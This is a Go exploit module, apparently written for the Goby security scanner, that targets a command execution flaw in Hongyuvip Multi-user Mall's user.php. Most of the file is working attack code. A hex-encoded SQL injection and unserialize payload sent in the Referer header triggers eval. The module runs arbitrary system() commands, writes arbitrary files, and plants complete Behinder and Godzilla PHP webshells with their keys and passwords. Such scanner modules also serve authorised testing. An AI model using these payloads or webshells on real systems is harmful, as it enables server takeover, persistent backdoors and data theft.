package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Hongyuvip Multi-user Mall user.php Arbitrary Command Execution Vulnerability",
    "Description": "<p>Hongyuvip Multi-user Mall is an online mall platform with multi-user tasks.</p><p>There is an arbitrary command execution vulnerability in user.php of Hongyuvip Multi-user Mall, which allows attackers to execute arbitrary code on the server side, write to the back door, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Hongyu-Mall",
    "Homepage": "http://www.hongyuvip.com/",
    "DisclosureDate": "2023-02-27",
    "Author": "heiyeleng",
    "FofaQuery": "body=\"content=\\\"HongYuJD\" && body=\"68ecshopcom_360buy\" && body!=\"content=\\\"ECSHOP\"",
    "GobyQuery": "body=\"content=\\\"HongYuJD\" && body=\"68ecshopcom_360buy\" && body!=\"content=\\\"ECSHOP\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has not released a vulnerability patch yet. Please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://hongyuvip.com/\">http://hongyuvip.com/</a> .</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell,fileUpload",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "dir",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "fileName",
            "type": "input",
            "value": "abc.php",
            "show": "attackType=fileUpload"
        },
        {
            "name": "fileContent",
            "type": "input",
            "value": "<?php @error_reporting(0);echo \"hello\";?>",
            "show": "attackType=fileUpload"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "鸿宇多用户商城 user.php 任意命令执行漏洞",
            "Product": "鸿宇-商城",
            "Description": "<p>鸿宇多用户商城是一款多用户任务的在线商城平台。<br></p><p>鸿宇多用户商城 user.php 存在任意命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>厂商暂未发布漏洞补丁，请关注厂商主页及时获取更新：<a href=\"http://hongyuvip.com/\">http://hongyuvip.com/</a>。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Hongyuvip Multi-user Mall user.php Arbitrary Command Execution Vulnerability",
            "Product": "Hongyu-Mall",
            "Description": "<p>Hongyuvip Multi-user Mall is an online mall platform with multi-user tasks.</p><p>There is an arbitrary command execution vulnerability in user.php of Hongyuvip Multi-user Mall, which allows attackers to execute arbitrary code on the server side, write to the back door, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has not released a vulnerability patch yet. Please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://hongyuvip.com/\">http://hongyuvip.com/</a> .<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10829"
}`
	base64EncodeWaTqS := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}
	sendPayloadFlagWaTqS := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig("/user.php")
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadRequestConfig.Header.Store("Referer", "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:233:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243686959584e6c4e6a52665a47566a6232526c4b435266554539545646747961574e7258536b704f773d3d2729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}554fcae493e564ee0dc75bdf2ebf94ca")
		payloadRequestConfig.Data = "action=login&rick=" + base64EncodeWaTqS(payload)
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	checkFileFlagWaTqS := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		if !strings.HasPrefix(uri, `/`) {
			uri = `/` + uri
		}
		checkRequestConfig := httpclient.NewGetRequestConfig(uri)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}
	uploadFileFlagWaTqS := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		uploadRequestConfig := httpclient.NewPostRequestConfig("/user.php")
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		uploadRequestConfig.Header.Store("Referer", "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:233:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243686959584e6c4e6a52665a47566a6232526c4b435266554539545646747961574e7258536b704f773d3d2729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}554fcae493e564ee0dc75bdf2ebf94ca")
		uploadRequestConfig.Data = "action=login&rick=" + base64EncodeWaTqS("file_put_contents('"+filename+"',' "+content+"');")
		_, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
		if err != nil {
			return nil, err
		}
		return checkFileFlagWaTqS(hostInfo, filename)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadFlagWaTqS(hostinfo, "echo(md5(1));")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "c4ca4238a0b923820dcc509a6f75849b")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			filename := goutils.B2S(ss.Params["fileName"])
			content := goutils.B2S(ss.Params["fileContent"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "cmd" {
				resp, err := sendPayloadFlagWaTqS(expResult.HostInfo, "echo(system(\""+cmd+"\"));")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if resp.StatusCode == 200 {
					expResult.Output = regexp.MustCompile(`name="back_act" value="([\s\S]*?)xxx"`).FindStringSubmatch(resp.Utf8Html)[1]
					expResult.Success = true
					return expResult
				}
			} else if attackType == "webshell" {
				if webshell == "behinder" {
					filename = goutils.RandomHexString(16) + ".php"
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					filename = goutils.RandomHexString(16) + ".php"
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				}
			}
			_, err := uploadFileFlagWaTqS(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			expResult.Success = true
			if attackType == "fileUpload" {
				expResult.Output = "文件地址：" + expResult.HostInfo.FixedHostInfo + "/" + filename
				return expResult
			}
			expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
			if webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: php"
			return expResult
		},
	))
}
